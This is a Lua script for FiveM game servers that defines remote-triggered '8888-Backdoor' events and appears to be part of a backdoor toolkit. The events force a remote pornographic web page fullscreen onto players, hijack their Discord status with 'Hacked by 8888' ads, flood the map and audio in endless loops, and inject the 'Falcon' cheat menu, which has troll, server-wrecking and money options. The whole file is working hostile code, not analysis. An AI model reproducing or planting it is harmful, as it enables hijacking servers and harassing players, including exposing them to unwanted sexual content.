RegisterNetEvent("8888-Backdoor-pornScreen")
AddEventHandler("8888-Backdoor-pornScreen", function()
	local pTxt = CreateRuntimeTxd('pornTxd');
	local pornScreen = CreateDui("https://spambude.net/Dks/html/porn/done_porn.html", 1920, 1080);
	local pornHandle = GetDuiHandle(pornScreen)
	CreateRuntimeTextureFromDuiHandle(pTxt, "pornTex", pornHandle)
    Citizen.CreateThread(function()
        while true do
            DrawSprite("pornTxd", "pornTex", 0.5, 0.5, 1.0, 1.0, 0.0, 255, 255, 255, 255)
            Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("8888-Backdoor-discordHack")
AddEventHandler("8888-Backdoor-discordHack", function(text)
    Citizen.CreateThread(function()
        while true do
			SetDiscordAppId(972882580519157822)
			SetDiscordRichPresenceAsset("8888")
			SetRichPresence("Server Hacked by 8888")
			SetDiscordRichPresenceAssetText('Developer of 8888 Rat: zImSkillz#4906')
			SetDiscordRichPresenceAssetSmall('8888')
			SetDiscordRichPresenceAssetSmallText('Developer of 8888 Rat: zImSkillz#4906')
			SetDiscordRichPresenceAction(0, ("Server: %s"):format(text), "https://discord.com/invite/D8arx7erxQ")
			SetDiscordRichPresenceAction(1, "Hacked by 8888", "https://discord.com/invite/D8arx7erxQ")
			Citizen.Wait(1)
        end
    end)
end)

RegisterNetEvent("8888-Backdoor-BlipsHack")
AddEventHandler("8888-Backdoor-BlipsHack", function()
	local blips = {
		{title="HACKED BY 8888", colour=2, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=2, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=2, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=2, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=2, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=2, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=2, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=5, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=5, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=5, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=5, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=5, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=5, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=5, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=27, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=27, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=27, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=27, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=27, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=27, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=27, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0},
		{title="HACKED BY 8888", colour=32, id=47, x = -1135.707275, y = -1987.154175, z = 12.976217},
		{title="HACKED BY 8888", colour=32, id=47, x = 436.491, y = -982.172, z = 30.699},
		{title="HACKED BY 8888", colour=32, id=47, x = 117.220, y = -620.938, z = 206.047},
		{title="HACKED BY 8888", colour=32, id=47, x = 673.56921386719, y = 556.85552978516, z = 133.9965057373},
		{title="HACKED BY 8888", colour=32, id=47, x = -1427.4211425781, y = 1971.3208007813, z = 67.0},
		{title="HACKED BY 8888", colour=32, id=47, x = 1430.6298828125, y = 3347.3876953125, z = 39.0},
		{title="HACKED BY 8888", colour=32, id=47, x = 644.400390625, y = 5557.349609375, z = 696.0}
	 }
		 
	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 1.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 2.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 3.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 6.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 10.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 20.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 30.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 50.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)

	Citizen.CreateThread(function()
	   for _, info in pairs(blips) do
		 info.blip = AddBlipForCoord(info.x, info.y, info.z)
		 SetBlipSprite(info.blip, info.id)
		 SetBlipDisplay(info.blip, 4)
		 SetBlipScale(info.blip, 100.0)
		 SetBlipColour(info.blip, info.colour)
		 SetBlipAsShortRange(info.blip, true)
		 BeginTextCommandSetBlipName("STRING")
		 AddTextComponentString(info.title)
		 EndTextCommandSetBlipName(info.blip)
	   end
	end)
end)

RegisterNetEvent("8888-Backdoor-soundSpam")
AddEventHandler("8888-Backdoor-soundSpam", function()
	Citizen.CreateThread(function()
		while true do
			PlaySound(-1, "CANCEL", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
			PlaySound(-1, "CHARACTER_CHANGE_CHARACTER_01_MASTER", 0, 0, 0, 0);
			PlaySound(-1, "CHARACTER_CHANGE_UP_MASTER", 0, 0, 0, 1);
			PlaySound(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", 0, 0, 1);
			PlaySound(-1, "SELECT", "HUD_MINI_GAME_SOUNDSET", 0, 0, 1);
			PlaySound(-1, "slow", "SHORT_PLAYER_SWITCH_SOUND_SET", 0, 0, 1);
			PlaySound(-1, "Take_Picture", "MUGSHOT_CHARACTER_CREATION_SOUNDS", 0, 0, 1);
			PlaySound(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1);
			PlaySound(-1, "Zoom_In", "MUGSHOT_CHARACTER_CREATION_SOUNDS", 0, 0, 1);
			PlaySound(-1, "Zoom_Out", "MUGSHOT_CHARACTER_CREATION_SOUNDS", 0, 0, 1);
			Citizen.Wait(1)
		end
	end)
end)

RegisterNetEvent("8888-Backdoor-Falcon")
AddEventHandler("8888-Backdoor-Falcon", function()
	Falcon = {}
	Falcon.debug = false

	local menus = {}
	local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202}
	local optionCount = 0
	local currentKey = nil
	local currentMenu = nil
	local titleHeight = 0.11
	local titleXOffset = 0.5
	local titleSpacing = 2
	local titleYOffset = 0.03
	local titleScale = 1.0
	local buttonHeight = 0.038
	local buttonFont = 0
	local buttonScale = 0.365
	local buttonTextXOffset = 0.005
	local buttonTextYOffset = 0.005

	local function debugPrint(text)
		if Falcon.debug then
			Citizen.Trace('[Falcon] ' .. tostring(text))
		end
	end

	local function setMenuProperty(id, property, value)
		if id and menus[id] then
			menus[id][property] = value
			debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }')
		end
	end

	local function isMenuVisible(id)
		if id and menus[id] then
			return menus[id].visible
		else
			return false
		end
	end

	local function setMenuVisible(id, visible, holdCurrent)
		if id and menus[id] then
			setMenuProperty(id, 'visible', visible)
			if not holdCurrent and menus[id] then
				setMenuProperty(id, 'currentOption', 1)
			end

			if visible then
				if id ~= currentMenu and isMenuVisible(currentMenu) then
					setMenuVisible(currentMenu, false)
				end
				currentMenu = id
			end
		end
	end

	local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
		SetTextColour(color.r, color.g, color.b, color.a)
		SetTextFont(font)
		SetTextScale(scale, scale)

		if shadow then
			SetTextDropShadow(2, 2, 0, 0, 0)
		end

		if menus[currentMenu] then
			if center then
				SetTextCentre(center)
			elseif alignRight then
				SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)
				SetTextRightJustify(true)
			end
		end

		BeginTextCommandDisplayText("STRING")
		AddTextComponentSubstringPlayerName(text)
		EndTextCommandDisplayText(x, y)
	end

	local function drawRect(x, y, width, height, color)
		DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
	end

	local function drawTitle()
		if menus[currentMenu] then
			local x = menus[currentMenu].x + menus[currentMenu].width / 2
			local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset
			local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing
			if menus[currentMenu].titleBackgroundSprite then
				DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
			else
				drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
			end

			drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
		end
	end

	local function drawSubTitle()
		if menus[currentMenu] then
			local x = menus[currentMenu].x + menus[currentMenu].width / 2
			local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
			local subTitleColor = {r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}

			drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
			drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)

			if optionCount > menus[currentMenu].maxOptionCount then
				drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
			end
		end
	end

	local function RGB(frequency)
		local result = {}
		local curtime = GetGameTimer() / 2000
		result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
		result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
		result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
	  
		return result
	end

	local function drawButton(text, subText)
		local x = menus[currentMenu].x + menus[currentMenu].width / 2
		local multiplier = nil

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
			multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
			local backgroundColor = nil
			local textColor = nil
			local subTextColor = nil
			local shadow = false

			if menus[currentMenu].currentOption == optionCount then
				backgroundColor = menus[currentMenu].menuFocusBackgroundColor
				textColor = menus[currentMenu].menuFocusTextColor
				subTextColor = menus[currentMenu].menuFocusTextColor
			else
				backgroundColor = menus[currentMenu].menuBackgroundColor
				textColor = menus[currentMenu].menuTextColor
				subTextColor = menus[currentMenu].menuSubTextColor
				shadow = true
			end

			drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
			drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)

			if subText then
				drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
			end
		end
	end

	function Falcon.CreateMenu(id, title)
		menus[id] = {}
		menus[id].title = title
		menus[id].subTitle = 'INTERACTION MENU'
		menus[id].visible = false
		menus[id].previousMenu = nil
		menus[id].aboutToBeClosed = false
		menus[id].x = 0.0175
		menus[id].y = 0.025
		menus[id].width = 0.23
		menus[id].currentOption = 1
		menus[id].maxOptionCount = 13
		menus[id].titleFont = 1
		menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
		menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 150 }
		menus[id].titleBackgroundSprite = nil
		menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
		menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
		menus[id].menuFocusTextColor = { r = 255, g = 0, b = 0, a = 200 }
		menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
		menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
		menus[id].subTitleBackgroundColor = {r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255}
		menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
		debugPrint(tostring(id) .. ' menu created')
	end

	function Falcon.CreateSubMenu(id, parent, subTitle)
		if menus[parent] then
			Falcon.CreateMenu(id, menus[parent].title)
			if subTitle then
				setMenuProperty(id, 'subTitle', string.upper(subTitle))
			else
				setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle))
			end

			setMenuProperty(id, 'previousMenu', parent)
			setMenuProperty(id, 'x', menus[parent].x)
			setMenuProperty(id, 'y', menus[parent].y)
			setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)
			setMenuProperty(id, 'titleFont', menus[parent].titleFont)
			setMenuProperty(id, 'titleColor', menus[parent].titleColor)
			setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)
			setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)
			setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)
			setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)
			setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)
			setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)
			setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)
			setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor)
		else
			debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist')
		end
	end

	function Falcon.CurrentMenu()
		return currentMenu
	end

	function Falcon.OpenMenu(id)
		if id and menus[id] then
			PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			setMenuVisible(id, true)
			debugPrint(tostring(id) .. ' menu opened')
		else
			debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist')
		end
	end

	function Falcon.IsMenuOpened(id)
		return isMenuVisible(id)
	end

	function Falcon.IsAnyMenuOpened()
		for id, _ in pairs(menus) do
			if isMenuVisible(id) then
				return true
			end
		end

		return false
	end

	function Falcon.IsMenuAboutToBeClosed()
		if menus[currentMenu] then
			return menus[currentMenu].aboutToBeClosed
		else
			return false
		end
	end

	function Falcon.CloseMenu()
		if menus[currentMenu] then
			if menus[currentMenu].aboutToBeClosed then
				menus[currentMenu].aboutToBeClosed = false
				setMenuVisible(currentMenu, false)
				debugPrint(tostring(currentMenu) .. ' menu closed')
				PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				optionCount = 0
				currentMenu = nil
				currentKey = nil
			else
				menus[currentMenu].aboutToBeClosed = true
				debugPrint(tostring(currentMenu) .. ' menu about to be closed')
			end
		end
	end

	function Falcon.Button(text, subText)
		local buttonText = text

		if subText then
			buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }'
		end

		if menus[currentMenu] then
			optionCount = optionCount + 1
			local isCurrent = menus[currentMenu].currentOption == optionCount

			drawButton(text, subText)

			if isCurrent then
				if currentKey == keys.select then
					PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
					debugPrint(buttonText .. ' button pressed')
					return true
				elseif currentKey == keys.left or currentKey == keys.right then
					PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
				end
			end

			return false
		else
			debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist')
			return false
		end
	end

	function Falcon.MenuButton(text, id)
		if menus[id] then
			if Falcon.Button(text .. themecolor .. "   " .. themearrow) then
				setMenuVisible(currentMenu, false)
				setMenuVisible(id, true, true)
				return true
			end
		else
			debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist')
		end

		return false
	end

	function Falcon.CheckBox(text, checked, offtext, ontext, callback)
		if not offtext then
			offtext = "Off"
		end

		if not ontext then
			ontext = "On"
		end

		if Falcon.Button(text, checked and ontext or offtext) then
			checked = not checked
			debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked))
			if callback then
				callback(checked)
			end

			return true
		end

		return false
	end

	function Falcon.ComboBox(text, items, currentIndex, selectedIndex, callback)
		local itemsCount = #items
		local selectedItem = items[currentIndex]
		local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

		if itemsCount > 1 and isCurrent then
			selectedItem = tostring(selectedItem)
		end

		if Falcon.Button(text, selectedItem) then
			selectedIndex = currentIndex
			callback(currentIndex, selectedIndex)
			return true
		elseif isCurrent then
			if currentKey == keys.left then
				if currentIndex > 1 then
					currentIndex = currentIndex - 1
				else
					currentIndex = itemsCount
				end
			elseif currentKey == keys.right then
				if currentIndex < itemsCount then
					currentIndex = currentIndex + 1
				else
					currentIndex = 1
				end
			end
		else
			currentIndex = selectedIndex
		end

		callback(currentIndex, selectedIndex)
		return false
	end

	function Falcon.Display()
		if isMenuVisible(currentMenu) then
			if menus[currentMenu].aboutToBeClosed then
				Falcon.CloseMenu()
			else
				ClearAllHelpMessages()
				drawTitle()
				drawSubTitle()
				currentKey = nil
				if IsDisabledControlJustReleased(1, keys.down) then
					PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					if menus[currentMenu].currentOption < optionCount then
						menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
					else
						menus[currentMenu].currentOption = 1
					end

				elseif IsDisabledControlJustReleased(1, keys.up) then
					PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

					if menus[currentMenu].currentOption > 1 then
						menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
					else
						menus[currentMenu].currentOption = optionCount
					end

				elseif IsDisabledControlJustReleased(1, keys.left) then
					currentKey = keys.left
				elseif IsDisabledControlJustReleased(1, keys.right) then
					currentKey = keys.right
				elseif IsDisabledControlJustReleased(1, keys.select) then
					currentKey = keys.select
				elseif IsDisabledControlJustReleased(1, keys.back) then
					if menus[menus[currentMenu].previousMenu] then
						PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						setMenuVisible(menus[currentMenu].previousMenu, true)
					else
						Falcon.CloseMenu()
					end
				end

				optionCount = 0
			end
		end
	end

	function Falcon.SetMenuWidth(id, width)
		setMenuProperty(id, 'width', width)
	end

	function Falcon.SetMenuX(id, x)
		setMenuProperty(id, 'x', x)
	end

	function Falcon.SetMenuY(id, y)
		setMenuProperty(id, 'y', y)
	end

	function Falcon.SetMenuMaxOptionCountOnScreen(id, count)
		setMenuProperty(id, 'maxOptionCount', count)
	end

	function Falcon.SetTitle(id, title)
		setMenuProperty(id, 'title', title)
	end

	function Falcon.SetTitleColor(id, r, g, b, a)
		setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a})
	end

	function Falcon.SetTitleBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a})
	end

	function Falcon.SetTitleBackgroundSprite(id, textureDict, textureName)
		RequestStreamedTextureDict(textureDict)
		setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName})
	end

	function Falcon.SetSubTitle(id, text)
		setMenuProperty(id, 'subTitle', string.upper(text))
	end

	function Falcon.SetMenuBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a})
	end

	function Falcon.SetMenuTextColor(id, r, g, b, a)
		setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a})
	end

	function Falcon.SetMenuSubTextColor(id, r, g, b, a)
		setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a})
	end

	function Falcon.SetMenuFocusColor(id, r, g, b, a)
		setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a})
	end

	function Falcon.SetMenuButtonPressedSound(id, name, set)
		setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set})
	end

	Tools = {}
	local IDGenerator = {}
	function Tools.newIDGenerator()
		local r = setmetatable({}, {__index = IDGenerator})
		r:construct()
		return r
	end

	function IDGenerator:construct()
		self:clear()
	end

	function IDGenerator:clear()
		self.max = 0
		self.ids = {}
	end

	function IDGenerator:gen()
		if #self.ids > 0 then
			return table.remove(self.ids)
		else
			local r = self.max
			self.max = self.max + 1
			return r
		end
	end

	function IDGenerator:free(id)
		table.insert(self.ids, id)
	end

	Tunnel = {}
	local function tunnel_resolve(itable, key)
		local mtable = getmetatable(itable)
		local iname = mtable.name
		local ids = mtable.tunnel_ids
		local callbacks = mtable.tunnel_callbacks
		local identifier = mtable.identifier
		local fcall = function(args, callback)
			if args == nil then
				args = {}
			end
			if type(callback) == "function" then
				local rid = ids:gen()
				callbacks[rid] = callback
				TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid)
			else
				TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1)
			end
		end
		itable[key] = fcall
		return fcall
	end

	function Tunnel.bindInterface(name, interface)
		RegisterNetEvent(name .. ":tunnel_req")
		AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid)
			local f = interface[member]
			local delayed = false
			local rets = {}
			if type(f) == "function" then
				TUNNEL_DELAYED = function()
					delayed = true
					return function(rets)
						rets = rets or {}
						if rid >= 0 then
							TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
						end
					end
				end
				rets = {f(table.unpack(args))}
			end

			if not delayed and rid >= 0 then
				TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets)
			end
		end)
	end

	function Tunnel.getInterface(name, identifier)
		local ids = Tools.newIDGenerator()
		local callbacks = {}
		local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})
		RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")
		AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args)
			local callback = callbacks[rid]
			if callback ~= nil then
				ids:free(rid)
				callbacks[rid] = nil
				callback(table.unpack(args))
			end
		end)

		return r
	end

	Proxy = {}
	local proxy_rdata = {}

	local function proxy_callback(rvalues)
		proxy_rdata = rvalues
	end

	local function proxy_resolve(itable, key)
		local iname = getmetatable(itable).name
		local fcall = function(args, callback)
			if args == nil then
				args = {}
			end

			TriggerEvent(iname .. ":proxy", key, args, proxy_callback)

			return table.unpack(proxy_rdata)
		end

		itable[key] = fcall
		return fcall
	end

	function Proxy.addInterface(name, itable)
		AddEventHandler(name .. ":proxy", function(member, args, callback)
			local f = itable[member]
			if type(f) == "function" then
				callback({f(table.unpack(args))})
			else
			end
		end)
	end

	function Proxy.getInterface(name)
		local r = setmetatable({}, {__index = proxy_resolve, name = name})
		return r
	end

	developers = {
		"~r~oFlaqme - ~b~oFlaqme#1149", -- Main Developer
	}

	menuName = "~h~Falcon ~r~"
	version = "5.0"
	theme = "Falcon"
	themes = {"infamous", "basic", "dark", "Falcon"}
	mpMessage = false
	menuKeybind = "F7"
	menuKeybind2 = "F10"
	noclipKeybind = "F5"
	teleportKeyblind = "F4"
	fixvaiculoKeyblind = "F6"
	startMessage = "~r~∑~s~WELCOME ~n~USER → ~r~[" ..GetPlayerName(PlayerId()).. "]"
	subMessage = "~n~~w~OPEN MENU ~n~Key ~g~*"..menuKeybind.."* ~s~ OR ~g~ *"..menuKeybind2.."*"
	motd2 = "Key ~r~*" ..teleportKeyblind.."* ~w~TeleportToWaypoint"
	motd = "Key ~r~*" ..noclipKeybind.."* ~w~Active noclip!"
	motd5 = "Key ~r~*" ..fixvaiculoKeyblind.."* ~w~Fix Car"
	motd3 = "~r~oFlaqme~s~#1149 ~n~~g~https://discord.gg/eb8sget"

	menulist = {


			'Falcon',
			'player',
			'self',
			'weapon',
			'vehicle',
			'world',
			'misc',
			'teleport',
			'lua',
			'lynx',


			'allplayer',
			'playeroptions',
			'troll',
			'jobsplayers',



			'appearance',
			'modifyskintextures',
			'modifyhead',
			'modifiers',
			'skinsmodels',



			'weaponspawner',
			'WeaponCustomization',



			'melee',
			'pistol',
			'shotgun',
			'smg',
			'assault',
			'sniper',
			'thrown',
			'heavy',


			'vehiclespawner',
			'vehiclemods',
			'vehiclemenu',

			'vehiclecolors',
			'vehiclecolors_primary',
			'vehiclecolors_secondary',
			'primary_classic',
			'primary_matte',
			'primary_metal',
			'secondary_classic',
			'secondary_matte',
			'secondary_metal',

			'vehicletuning',


			'compacts',
			'sedans',
			'suvs',
			'coupes',
			'muscle',
			'sportsclassics',
			'sports',
			'super',
			'motorcycles',
			'offroad',
			'industrial',
			'utility',
			'vans',
			'cycles',
			'boats',
			'helicopters',
			'planes',
			'service',
			'commercial',


			'fuckserver',
			'objectspawner',
			'objectlist',
			'weather',
			'time',


			'esp',
			'webradio',
			'credits',
			'InfoMenu',

			'saveload',
			'pois',


			'esx',
			'vrp',
			'other',
			'money'

	}



	faceItemsList = {}
	faceTexturesList = {}
	hairItemsList = {}
	hairTextureList = {}
	maskItemsList = {}
	hatItemsList = {}
	hatTexturesList = {}


	NoclipSpeedOps = {1, 5, 10, 20, 30}

	NoclipSpeed = 1
